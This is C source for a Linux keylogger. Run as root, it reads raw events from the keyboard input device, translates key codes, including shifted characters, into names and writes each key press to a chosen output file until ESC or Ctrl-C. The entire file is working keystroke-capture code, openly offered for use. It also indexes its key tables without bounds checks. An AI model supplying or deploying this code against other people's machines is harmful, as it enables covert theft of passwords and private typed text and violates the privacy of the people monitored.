#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <fcntl.h>
#include <signal.h>

#include "keylogger.h"

#define UK "UNKNOWN"


static const char * keycodes[] =
{
    "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",
    "-", "=", "BACKSPACE", "TAB", "q", "w", "e", "r", "t", "y", "u", "i",
    "o", "p", "[", "]", "ENTER", "L_CTRL", "a", "s", "d", "f", "g", "h",
    "j", "k", "l", ";", "'", "`", "L_SHIFT", "\\", "z", "x", "c", "v", "b",
    "n", "m", ",", ".", "/", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK", 
    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK",
    "SCROLL_LOCK", "NL_7", "NL_8", "NL_9", "-", "NL_4", "NL5",
    "NL_6", "+", "NL_1", "NL_2", "NL_3", "INS", "DEL", UK, UK, UK,
    "F11", "F12", UK, UK,	UK, UK,	UK, UK, UK, "R_ENTER", "R_CTRL", "/", 
    "PRT_SCR", "R_ALT", UK, "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END", 
    "DOWN",	"PAGE_DOWN", "INSERT", "DELETE", UK, UK, UK, UK,UK, UK, UK, 
    "PAUSE"
};

static const char * shifted_keycodes[] =
{
    "RESERVED", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", 
    "_", "+", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I", 
    "O", "P", "{", "}", "ENTER", "L_CTRL", "A", "S", "D", "F", "G", "H", 
    "J", "K", "L", ":", "\"", "~", "L_SHIFT", "|", "Z", "X", "C", "V", "B", 
    "N", "M", "<", ">", "?", "R_SHIFT", "*", "L_ALT", "SPACE", "CAPS_LOCK", 
    "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK", 
    "SCROLL_LOCK", "HOME", "UP", "PGUP", "-", "LEFT", "NL_5", 
    "R_ARROW", "+", "END", "DOWN", "PGDN", "INS", "DEL", UK, UK, UK, 
    "F11", "F12", UK, UK,	UK, UK,	UK, UK, UK, "R_ENTER", "R_CTRL", "/", 
    "PRT_SCR", "R_ALT", UK, "HOME", "UP", "PAGE_UP", "LEFT", "RIGHT", "END", 
    "DOWN",	"PAGE_DOWN", "INSERT", "DELETE", UK, UK, UK, UK,UK, UK, UK, 
    "PAUSE"
};


static int running;
static int keyboard_fd;
static char *output_file;


static void sig_handler(int signo)
{
    running = 0;
}

static void keylogger_usage(void)
{
    printf(
            "\n"
            "Usage:\n"
            "     sudo ./keyloger -f file\n"
            "\n"
          );
    exit(EXIT_FAILURE);
}

static int keylogger_isShift(int code)
{
    return ((code == KEY_LEFTSHIFT) || (code == KEY_RIGHTSHIFT));
}

static int keylogger_isEsc(int code)
{
    return (code == KEY_ESC);
}

static int keylogger_isRoot(void) {
    if (geteuid() != 0) {
        fprintf(stderr, "\nMust run it as root, in order to have access "
                "to the keyboard device\n");
        return 0;
    }
    return 1;	
}

void keylogger_init (char *ofile)
{
    signal(SIGINT, sig_handler);

    if (!ofile)
        keylogger_usage();

    running = 1;
    output_file = ofile;

    if (!keylogger_isRoot())
        keylogger_usage();

    if ((keyboard_fd = open(KEYBOARD, O_RDONLY)) < 0) {
        fprintf(stderr, "\nUnable to read from the device\n");
        exit(EXIT_FAILURE);
    }
}

void keylogger_exit (void)
{
    close(keyboard_fd);
}

void keylogger_run(void)
{
    int shift_flag = 0;
    FILE *file = NULL;
    struct input_event event;

    if (output_file) {
        file = fopen(output_file, "w");
        if (!file) {
            fprintf(stderr, "Error opening file\n");
            return;
        }
    }

    while (running) {
        read(keyboard_fd, &event, sizeof(event));

        /* If a key from the keyboard is pressed */
        if (event.type == EV_KEY && event.value == 1) {
            /* If it's Esc, exit */
            if (keylogger_isEsc(event.code)) return;
            /* If it's shift (left or right), set the flag */
            if (keylogger_isShift(event.code)) shift_flag = event.code;
            /* If it's shift and another key, print the shifted value */
            if (shift_flag && !keylogger_isShift(event.code)) {
                /* Output to file */
                if (output_file != NULL) {
                    fprintf(file, "%s + %s\n",
                            keycodes[shift_flag], shifted_keycodes[event.code]);
                    fflush(file);
                }
            }
            /* If it's not shift, just print the key */
            else if (!shift_flag && !keylogger_isShift(event.code)) {
                /* Again, output to file */
                if (output_file != NULL) {
                    fprintf(file, "%s\n", keycodes[event.code]);
                    fflush(file);
                }
            }
        } else {
            /* If a key from the keyboard is released */
            if (event.type == EV_KEY && event.value == 0) {
                if (keylogger_isShift(event.code)) shift_flag = 0;
            }
        }
    }

    if (file) fclose(file);

    return;
}
